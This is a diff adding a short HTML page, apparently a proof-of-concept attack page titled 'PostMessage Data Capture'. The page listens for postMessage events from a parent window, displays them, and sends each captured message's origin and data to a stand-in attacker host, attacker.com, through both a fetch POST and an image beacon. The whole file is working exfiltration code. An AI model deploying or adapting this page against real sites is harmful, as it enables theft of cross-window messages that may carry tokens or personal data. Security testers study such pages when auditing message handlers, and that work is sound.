@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body{font-family:monospace;background:#1a1a2e;color:#0f0;padding:20px}
+h1{color:#0f0}
+pre{background:#000;padding:15px;border-radius:4px;overflow-x:auto}
+.success{color:#0f0}
+.data{color:#ff0}
+</style>
+</head>
+<body>
+<h1>📡 PostMessage Data Capture</h1>
+<div id="log"></div>
+<script>
+var log=document.getElementById('log');
+function addLog(type,data){
+  var p=document.createElement('pre');
+  p.className=type;
+  p.textContent='['+new Date().toISOString()+'] '+JSON.stringify(data,null,2);
+  log.appendChild(p);
+}
+
+addLog('info','Waiting for postMessage from parent...');
+
+window.addEventListener('message',function(e){
+  addLog('success','CAPTURED MESSAGE:');
+  addLog('data',{
+    origin: e.origin,
+    data: e.data
+  });
+  
+  // Exfil
+  fetch('https://attacker.com/pm',{
+    method:'POST',
+    body:JSON.stringify({origin:e.origin,data:e.data})
+  }).catch(()=>{});
+  
+  // Also via image
+  new Image().src='https://attacker.com/pm?d='+encodeURIComponent(JSON.stringify(e.data));
+});
+</script>
+</body>
+</html>
